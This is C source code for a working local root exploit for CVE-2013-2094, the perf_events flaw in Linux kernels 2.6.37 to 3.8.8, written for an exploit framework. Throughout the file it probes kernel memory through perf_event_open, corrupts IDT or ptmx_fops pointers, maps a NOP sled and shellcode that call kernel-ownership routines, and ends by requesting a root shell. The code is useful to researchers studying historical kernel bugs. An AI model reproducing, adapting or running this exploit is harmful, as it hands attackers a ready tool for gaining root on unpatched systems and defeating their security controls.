/*
 * original exploit by sd@fucksheep.org, written in 2010
 * heavily modified by spender to do things and stuff
 */

#define _GNU_SOURCE 1
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdint.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/uio.h>
#include "exp_framework.h"
#include <assert.h>

#define BIT64	(sizeof(unsigned long) != sizeof(unsigned int))

struct exploit_state *exp_state;
int is_old_kernel = 0;

char *desc = "Abacus: Linux 2.6.37 -> 3.8.8 PERF_EVENTS local root";
char *cve = "CVE-2013-2094";

int requires_null_page = 0;

#define JMPLABELBASE64 0x1780000000
#define JMPLABELBASE32 0x01980000
#define JMPLABELBASE (BIT64 ? JMPLABELBASE64 : JMPLABELBASE32)
#define JMPLABELNOMODBASE64 0xd80000000
#define JMPLABELNOMODBASE32 0x40000000
#define JMPLABELNOMODBASE (BIT64 ? JMPLABELNOMODBASE64 : JMPLABELNOMODBASE32)
#define BASE64  0x380000000
#define BASE32  0x80000000
#define BASE (BIT64 ? BASE64 : BASE32)
#define SIZE64  0x04000000
#define SIZE32  0x01000000
#define SIZE (BIT64 ? SIZE64 : SIZE32)
#define KSIZE  (BIT64 ? 0x2000000 : 0x2000)
#define SYSCALL_NO (BIT64 ? 298 : 336)
#define MAGICVAL (BIT64 ? 0x44444443 : 0x44444445)

unsigned long num_incs1;
unsigned long probe1addr;
unsigned long probe2addr;
unsigned long probebase;
static int wrap_val;
static int structsize;
static int has_jmplabel;
static int is_unaligned;
static int target_offset;
static int computed_index;
static unsigned long target_addr;
static unsigned long array_base;
unsigned long kbase;
static int xen_pv;

struct {
	uint16_t limit;
	uint64_t addr;
} __attribute__((packed)) idt;

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int ring0_cleanup(void)
{
	if (BIT64) {
		if (xen_pv) {
			*(unsigned int *)(target_addr + target_offset) = 0;
		} else {
			*(unsigned int *)(target_addr + target_offset) = 0xffffffff;
		}
		/* clean up the probe effects for redhat tears */
		*(unsigned int *)(array_base - structsize) = *(unsigned int *)(array_base - structsize) - num_incs1;
		*(unsigned int *)(array_base - (2 * structsize)) = *(unsigned int *)(array_base - (2 * structsize)) - 1;
	}
	/* on 32bit we let the kernel clean up for us */
	return 0;
}

int main_pid;
int signals_dont_work[2];
int total_children;

static int send_event(uint32_t off, int is_probe) {
	uint64_t buf[10] = { 0x4800000001,off,0,0,0,0x320 };
	int fd;

	if ((int)off >= 0) {
		printf(" [-] Target is invalid, index is positive.\n");
		exit(1);
	}
	if (getpid() == main_pid)
		printf(" [+] Submitting index of %d to perf_event_open\n", (int)off);
	fd = syscall(SYSCALL_NO, buf, 0, -1, -1, 0);

	if (fd < 0) {
		printf(" [-] System rejected creation of perf event.  Either this system is patched, or a previous failed exploit was run against it.\n");
		if (is_probe || BIT64)
			exit(1);
	}
	/* we don't need to hold them open in the xen pv ops case on x64 */
	if (BIT64)
		close(fd);
	return fd;
}

//static unsigned long security_ops;

void ptmx_trigger(void)
{
	struct iovec iov;
	int fd;

	fd = open("/dev/ptmx", O_RDWR);
	if (fd < 0) {
		printf(" [-] Unable to open /dev/ptmx\n");
		exit(1);
	}
	/* this choice is arbitrary */
	iov.iov_base = &iov;
	iov.iov_len = sizeof(iov);
	/* this one is not ;) */
	if (xen_pv && is_unaligned)
		writev(fd, &iov, 1);
	else
		readv(fd, &iov, 1);
	// won't reach here
	close(fd);
}


static void check_maxfiles(void)
{
	unsigned long maxfiles;
	FILE *f = fopen("/proc/sys/fs/file-max", "r");
	if (f) {
		fscanf(f, "%lu", &maxfiles);
		fclose(f);
		if (maxfiles < kbase) {
			printf(" [-] Lack of sufficient RAM or low fs.file-max sysctl setting prevents our choice of exploitation.\n");
			exit(1);
		}
	}
	return;
}

int trigger(void)
{
	/* !SMEP version */
	printf(" [!] Array base is %p\n", (void *)array_base);
	printf(" [!] Detected structure size of %d bytes\n", structsize);
	printf(" [!] Targeting %p\n", (void *)(array_base + (structsize * computed_index)));

#ifdef __x86_64__
	if (xen_pv) {
		int i;
		for (i = 0; i < kbase; i++) {
			send_event(computed_index, 0);
		}
		ptmx_trigger();
	} else {
		send_event(computed_index, 0);
		if (is_unaligned) {
			asm volatile (
			"pushfq\n"
			"orq $0x40000, (%rsp)\n"
			"popfq\n"
			"test %rax, 0x1(%rsp)\n"
			);
		} else {
			asm("int $0x4");
		}
	}
#else
	{
		unsigned long kbase_counter = 0;
		int ret;
		int pipes[2];
		int i;
		char garbage;
		int max_open = 768;
		int real_max = 1024;
		struct rlimit rlim = { 0 };


		if (!getrlimit(RLIMIT_NOFILE, &rlim)) {
			real_max = rlim.rlim_max;
			max_open = rlim.rlim_max - 50;
			rlim.rlim_cur = rlim.rlim_max;
			if (setrlimit(RLIMIT_NOFILE, &rlim))
				max_open = 768;
		}

		/* child notification/reaping code from zx2c4 */

		pipe(pipes);
		pipe(signals_dont_work);

		main_pid = getpid();

		total_children = 0;

		printf(" [!] Forking off %lu children to set required pointer value, please wait...\n", (kbase + max_open - 1) / max_open);

		while (kbase_counter < kbase) {
			if (!fork()) {
				int x;
				int savefd1, savefd2;
				savefd1 = pipes[1];
				savefd2 = signals_dont_work[0];
				for (x = 0; x < real_max; x++)
					if (x != savefd1 && x != savefd2)
						close(x);
				for (x = 0; x < max_open; x++)
					send_event(computed_index, 0);
				write(pipes[1], &garbage, 1);
				read(signals_dont_work[0], &garbage, 1);
				_exit(0);
			}
			kbase_counter += max_open;
			total_children++;

		}
		for (i = 0; i < total_children; i++)
			read(pipes[0], &garbage, 1);

		ptmx_trigger();
	}
#endif

	/* SMEP/SMAP version, shift security_ops */
	//security_ops = (unsigned long)exp_state->get_kernel_sym("security_ops");
	//target_addr = security_ops;
	//target_offset = 0;
	//computed_index = -((array_base-target_addr-target_offset)/structsize);
	//
	//for (i = 0; i < sizeof(unsigned long); i++)
	//	send_event(computed_index, 0);
	// add fancy trigger here

	return 0;
}

int post(void)
{
	write(signals_dont_work[1], &total_children, total_children);
	return RUN_ROOTSHELL;
}

static unsigned char *map_page_file_fixed(unsigned long addr, int prot, int fd)
{
	unsigned char *mem;

	mem = (unsigned char *)mmap((void *)addr, 0x1000, prot, MAP_SHARED | MAP_FIXED, fd, 0);
	if (mem == MAP_FAILED) {
		printf("unable to mmap file\n");
		exit(1);
	}

	return mem;
}

static unsigned char *map_anon_page(void)
{
	unsigned char *mem;

	mem = (unsigned char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mem == MAP_FAILED) {
		printf("unable to mmap\n");
		exit(1);
	}

	return mem;
}

static void fill_file_with_char(const char *filename, unsigned char thechar)
{
	int fd;
	unsigned char *mem;

	fd = open(filename, O_CREAT | O_WRONLY, 0644);
	if (fd < 0) {
		printf("unable to create mmap file\n");
		exit(1);
	}

	mem = map_anon_page();
	memset(mem, thechar, 0x1000);
	write(fd, mem, 0x1000);
	close(fd);
	munmap(mem, 0x1000);

	return;
}

static inline unsigned long page_align(unsigned long addr)
{
	return addr & ~0x0FFFUL;
}

/* 100% of the time this works every time
 * it's also completely ridiculous
 *
 * elito hungarian techniques!
 */
static int super_secure_probe_not_like_black_panther(void)
{
	unsigned long bases[3] = { BASE, JMPLABELBASE, JMPLABELNOMODBASE };
	int uniquefds[3];
	unsigned long currunique;
	unsigned long p;
	unsigned long probe1page;
	int i, x;
	int fd1, fd2;
	unsigned int *probe;
	int mapidx = -1;
	unsigned long stride;
	unsigned long strideidx;
	unsigned long low, high;
	unsigned long ourbase;
	unsigned long sel;

	fill_file_with_char("./lock_me_macaroni_1", 0x44);
	fill_file_with_char("./lock_me_macaroni_2", 0x44);
	fill_file_with_char("./lock_me_macaroni_3", 0x44);

	uniquefds[0] = open("./lock_me_macaroni_1", O_RDWR);
	uniquefds[1] = open("./lock_me_macaroni_2", O_RDWR);
	uniquefds[2] = open("./lock_me_macaroni_3", O_RDWR);

	if (uniquefds[0] < 0 || uniquefds[1] < 0 || uniquefds[2] < 0) {
		printf("Unable to open userland buffer files\n");
		exit(1);
	}

	unlink("./lock_me_macaroni_1");
	unlink("./lock_me_macaroni_2");
	unlink("./lock_me_macaroni_3");

	printf(" [!] Securely probing with great effort\n");

	/* isolate to a single map */
	for (i = 0; i < 3; i++) {
		for (p = bases[i]; p < bases[i] + SIZE; p += 0x1000) {
			map_page_file_fixed(p, PROT_READ | PROT_WRITE, uniquefds[i]);
			if (p == bases[i]) {
				char c;
				assert(!mlock((void *)p, 0x1000));
				/* set up pte */
				c = *(volatile char *)p;
			}
		}
	}
	fd1 = send_event(BIT64 ? -1 : -(1024 * 1024 * 1024)/4, 1);
	num_incs1++;
	for (i = 0; i < 3; i++) {
		probe = (unsigned int *)(bases[i]);
		for (x = 0; x < 0x1000/sizeof(unsigned int); x++) {
			if (probe[x] == MAGICVAL) {
				mapidx = i;
				goto foundit;
			}
		}
	}
foundit:
	if (!BIT64)
		close(fd1);

	if (mapidx == -1) {
		printf(" [-] Unsupported configuration.\n");
		exit(1);
	}

	for (i = 0; i < 3; i++) {
		if (i != mapidx)
			munmap(bases[i], SIZE);
	}

	ourbase = bases[mapidx];
	stride = SIZE / 2;
	low = ourbase;
	high = low + SIZE;

	while (stride >= 0x1000) {
		for (p = low; p < high; p += stride) {
			memset((void *)p, 0x44, 0x1000);
			msync((void *)p, 0x1000, MS_SYNC);
			for (strideidx = 0; strideidx < stride/0x1000; strideidx++) {
				sel = (p < (low + stride)) ? 0 : 1;
				map_page_file_fixed(p + (strideidx * 0x1000), PROT_READ | PROT_WRITE, uniquefds[sel]);
			}
		}
		fd1 = send_event(BIT64 ? -1 : -(1024 * 1024 * 1024)/4, 1);
		num_incs1++;
		probe = (unsigned int *)low;
		for (x = 0; x < 0x1000/sizeof(unsigned int); x++) {
			if (probe[x] == MAGICVAL) {
				high = low + stride;
				probe1addr = (unsigned long)&probe[x];
			}
		}
		probe = (unsigned int *)(low + stride);
		for (x = 0; x < 0x1000/sizeof(unsigned int); x++) {
			if (probe[x] == MAGICVAL) {
				low = low + stride;
				probe1addr = (unsigned long)&probe[x];
			}
		}
		if (!BIT64)
			close(fd1);
		stride /= 2;
	}

	probe1page = page_align(probe1addr);

	if (!probe1addr) {
		printf(" [-] Unsupported configuration.\n");
		exit(1);
	}

gotprobe:
	/* blow away old mappings here */
	map_page_file_fixed(probe1page - 0x1000, PROT_READ | PROT_WRITE, uniquefds[0]);
	map_page_file_fixed(probe1page, PROT_READ | PROT_WRITE, uniquefds[1]);
	map_page_file_fixed(probe1page + 0x1000, PROT_READ | PROT_WRITE, uniquefds[2]);

	memset((void *)(probe1page - 0x1000), 0x44, 0x3000);

	fd2 = send_event(BIT64 ? -2 : -(1024 * 1024 * 1024)/4-1, 1);
	probe = (unsigned int *)(probe1page - 0x1000);
	for (i = 0; i < 0x3000/sizeof(unsigned int); i++) {
		if (probe[i] == MAGICVAL) {
			probe2addr = (unsigned long)&probe[i];
			break;
		}
	}
	if (!BIT64)
		close(fd2);

	close(uniquefds[0]);
	close(uniquefds[1]);
	close(uniquefds[2]);

	return abs(probe1addr - probe2addr);
}

int prepare(unsigned char *buf)
{
	unsigned char *mem;
	unsigned char *p;
	int fd;
	unsigned long idx;
	char c;

	assert(!mlock(&num_incs1, 0x1000));

	structsize = super_secure_probe_not_like_black_panther();
	if (structsize > 4)
		has_jmplabel = 1;
	wrap_val = (probe2addr - probebase) + 2 * structsize;

	if (BIT64) {
		/* use masked kernel range here */
		asm ("sidt %0" : "=m" (idt));
		kbase = idt.addr & 0xff000000;
		target_addr = idt.addr;
		array_base = 0xffffffff80000000UL | wrap_val;
		if ((target_addr & 0xfffffffff0000000UL) != 0xffffffff80000000UL) {
			xen_pv = 1;
			printf(" [!] Xen PV possibly detected, switching to alternative target\n");
			target_addr = (unsigned long)exp_state->get_kernel_sym("ptmx_fops");
			if (!target_addr) {
				printf(" [-] Symbols required for Xen PV exploitation (in this exploit).\n");
				exit(1);
			}
			target_offset = 4 * sizeof(unsigned long);
			if (has_jmplabel) {
				if  ((array_base - target_addr - target_offset) % structsize) {
					is_unaligned = 1;
					target_offset = 5 * sizeof(unsigned long);
				}
			}
		} else {
			/* do we need to target AC instead? */
			if (has_jmplabel) {
				if  ((array_base - target_addr) % structsize) {
					is_unaligned = 1;
					target_offset = 0x118;
				} else
					target_offset = 0x48;
			} else
				target_offset = 0x48;
		}
		computed_index = -((array_base-target_addr-target_offset)/structsize);
	} else {
		int brute;

		/* use just above mmap_min_addr here */
		kbase = 0;
		while (1) {
			mem = (unsigned char *)mmap((void *)kbase, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
			if (mem != MAP_FAILED) {
				printf(" [!] Placing payload just above mmap_min_addr at %p\n", (void *)kbase);
				check_maxfiles();
				munmap((void *)kbase, 0x1000);
				break;
			} else
				kbase += 0x1000;
		}
		array_base = (unsigned long)exp_state->get_kernel_sym("perf_swevent_enabled");
		target_addr = (unsigned long)exp_state->get_kernel_sym("ptmx_fops");
		if (!target_addr || !array_base) {
			printf(" [-] Symbols required for i386 exploitation (in this exploit).\n");
			exit(1);
		}
		target_offset = 4 * sizeof(unsigned long);
		computed_index = 0;
		for (brute = -1; brute < 0; brute--) {
			if (array_base + (brute * structsize) == (target_addr + target_offset)) {
				computed_index = brute;
				break;
			}
		}
		if (!computed_index) {
			printf(" [-] Unable to reach ptmx_fops target under this configuration.\n");
			exit(1);
		}
	}

	fill_file_with_char("./suckit_selinux_nopz", 0x90);

	fd = open("./suckit_selinux", O_CREAT | O_WRONLY, 0644);
	if (fd < 0) {
		printf("unable to create shellcode file\n");
		exit(1);
	}

	mem = (unsigned char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mem == MAP_FAILED) {
		printf("unable to mmap nop sled\n");
		goto error;
	}
	memset(mem, 0x90, 0x1000);
	p = (unsigned char *)(mem + 0x1000 - 3 - (2 * (2 + 4 + sizeof(unsigned long))));
	if (BIT64) {
		// swapgs
		p[0] = 0x0f;
		p[1] = 0x01;
		p[2] = 0xf8;
	} 
	p += 3;
	// call own_the_kernel
	p[0] = 0xff;
	p[1] = 0x15;
	*(unsigned int *)&p[2] = BIT64 ? 6 : kbase + KSIZE - (2 * sizeof(unsigned long));
	// call exit_kernel
	p[6] = 0xff;
	p[7] = 0x25;
	*(unsigned int *)&p[8] = BIT64 ? sizeof(unsigned long) : kbase + KSIZE - sizeof(unsigned long);
	*(unsigned long *)&p[12] = (unsigned long)exp_state->own_the_kernel;
	*(unsigned long *)&p[12 + sizeof(unsigned long)] = (unsigned long)exp_state->exit_kernel;

	write(fd, mem, 0x1000);
	close(fd);
	munmap(mem, 0x1000);

	fd = open("./suckit_selinux_nopz", O_RDONLY);
	if (fd < 0) {
		printf("unable to open nop sled file for reading\n");
		goto error;
	}
	// map in nops and page them in
	for (idx = 0; idx < (KSIZE/0x1000)-1; idx++) {
		mem = (unsigned char *)mmap((void *)(kbase + idx * 0x1000), 0x1000, PROT_READ | PROT_EXEC, MAP_FIXED | MAP_PRIVATE, fd, 0);
		if (mem != (unsigned char *)(kbase + idx * 0x1000)) {
			printf("unable to mmap\n");
			goto error;
		}
		if (!idx)
			assert(!mlock(mem, 0x1000));
		c = *(volatile char *)mem;
	}
	close(fd);

	fd = open("./suckit_selinux", O_RDONLY);
	if (fd < 0) {
		printf("unable to open shellcode file for reading\n");
		goto error;
	}
	mem = (unsigned char *)mmap((void *)(kbase + KSIZE - 0x1000), 0x1000, PROT_READ | PROT_EXEC, MAP_FIXED | MAP_PRIVATE, fd, 0);
	close(fd);
	if (mem != (unsigned char *)(kbase + KSIZE - 0x1000)) {
		printf("unable to mmap\n");
		goto error;
	}
	assert(!mlock(mem, 0x1000));
	c = *(volatile char *)mem;

	unlink("./suckit_selinux");
	unlink("./suckit_selinux_nopz");

	return 0;
error:
	unlink("./suckit_selinux");
	unlink("./suckit_selinux_nopz");
	exit(1);
}
